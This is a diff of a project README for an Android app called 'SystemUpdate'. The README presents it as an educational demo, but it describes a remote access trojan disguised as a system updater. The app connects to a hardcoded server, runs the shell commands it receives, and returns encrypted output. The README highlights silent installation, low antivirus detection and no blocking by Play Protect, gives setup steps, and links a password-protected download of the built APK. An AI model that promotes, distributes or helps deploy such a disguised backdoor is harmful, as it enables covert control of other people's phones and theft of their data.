@@ -1,6 +1,8 @@
 # 📱 SystemUpdate – Educational Android Background Client
 
-> ⚠️ **DISCLAIMER:** This project is intended for **educational and ethical testing purposes only**. It showcases how Android services and socket communication work. It’s **not stealthy malware**, and must **never be used for harmful or illegal purposes**.
+> ⚠️ **DISCLAIMER:** This project is intended for **educational and ethical testing purposes only**.  
+> It demonstrates how Android foreground services and socket communication work.  
+> It is **not stealth malware**, and **must not be used for illegal or harmful activities**.
 
 ---
 
@@ -8,64 +10,88 @@
 
 ![Demo GIF](./1.gif)
 
-> 🔍 This demo shows the APK being installed on an **Android 15 device** without any popups, warnings, or security prompts — even with the latest security patch (August 3, 2025). It blends in under the name "System Update".
+> 📲 This demo shows the APK being installed silently on an **Android 15 device**  
+> — no popups, security prompts, or warnings — even with the **August 3, 2025 security patch**.  
+> It appears as a normal system update app.
 
 ---
 
 ## 🧪 VirusTotal Scan Results
 
-The scan shows **minimal detection** by antivirus engines:
+- Only **2 engines** flagged the APK:  
+  - `Google` → *Android:Agent-GEN*  
+  - `IKARUS` → *Trojan.AndroidOS.Agent*
 
-- ✅ Only **Google** (Android:Agent-GEN) and **IKARUS** (Trojan.AndroidOS.Agent) flagged it.
-- ✅ **Google Play Protect did not block** the installation or execution.
+- ✅ **Google Play Protect DID NOT block** installation or execution.
 
-![Scan 1](./1.jpeg)
+![Scan 1](./1.jpeg)  
 ![Scan 2](./2.jpeg)
 
-> 🧠 These low detections are due to its simplicity and unknown signature — **not because it's stealthy**.
+> ⚠️ Low detection is due to simplicity and unfamiliar signature — **not because it’s stealthy or advanced**.
 
 ---
 
-## 🔧 What It Does
+## 🧩 What It Does
 
-SystemUpdate is a foreground Android service that mimics a system updater while performing remote command execution:
+SystemUpdate runs as a foreground Android service:
 
-- Displays a persistent "System Update" notification
-- Connects to a hardcoded IP and port
-- Encrypts/decrypts messages using AES
-- Executes shell commands received from the server
-- Sends back encrypted output
+- Shows a persistent notification: _“Updating system…”_
+- Connects to a hardcoded **IP/Port**
+- Uses **AES encryption** to receive commands and send output
+- Executes remote **shell commands** from server
 
 ---
 
 ## 🛠 How to Use
 
-1. Clone this repository
-2. Edit `SERVER_IP`, `SERVER_PORT`, and `SECRET_KEY` in `PayloadService.kt`
-3. Build the APK in Android Studio
-4. Install it on a test device (Android 13–15+)
-5. Start a compatible TCP server to send commands
+1. Clone this repo
+2. Open `PayloadService.kt` and edit:
+   - `SERVER_IP`
+   - `SERVER_PORT`
+   - `SECRET_KEY`
+3. Build the APK with Android Studio
+4. Install on a test device (Android 13–15+)
+5. Start your TCP server and connect
 
 ---
 
-## 📜 License – GNU General Public License v3
+## 📥 Download
 
-This project is licensed under the **GNU GPL v3**.
+> 🔐 Encrypted demo ZIP (APK + media) hosted on Mega:
 
-> If you modify and distribute this code, your version must also remain open-source under the same license.
+**[📦 Download from MEGA](https://mega.nz/file/eNlGTRaQ#Wy7WMTThmt4CXnpKpgImRnsCQcryFpfofM2Ok512kQ8)**  
+**Password:** `1234`
 
-See [`LICENSE`](./LICENSE) for full terms.
+Contents:
+- `SystemUpdate.apk`
+- Demo video (`1.mp4`)
+- VirusTotal results (`1.jpeg`, `2.jpeg`)
+- Install GIF (`1.gif`)
 
 ---
 
-## ❗ Final Thoughts
+## 📜 License – GNU GPL v3
 
-This project is a **basic educational tool**, not a hacking suite. Its low detection is due to novelty, not evasion. If you're studying Android internals, encryption, or services — this is a fun sandbox.
+This code is licensed under the **GNU General Public License v3**.  
+You're free to **use, modify, and redistribute**, but any derivative must remain **open-source under the same license**.
+
+See [`LICENSE`](./LICENSE) for details.
+
+---
+
+## 🧠 Final Thoughts
+
+This project is a simple educational sandbox for:
+- Android services
+- Encrypted socket communication
+- Remote shell execution testing
+
+It is **not obfuscated**, does not attempt to bypass advanced security, and should only be used **in controlled, ethical environments**.
 
 ---
 
 ### ✅ Use it to learn  
-### ❌ Don’t use it to harm  
-### 🔧 Modify, break, and explore responsibly  
+### ❌ Never use it to harm  
+### 🧪 Break, explore, improve — **responsibly**  
 
-> Be curious, not malicious. 🎓
+> 💡 Be curious, not malicious.
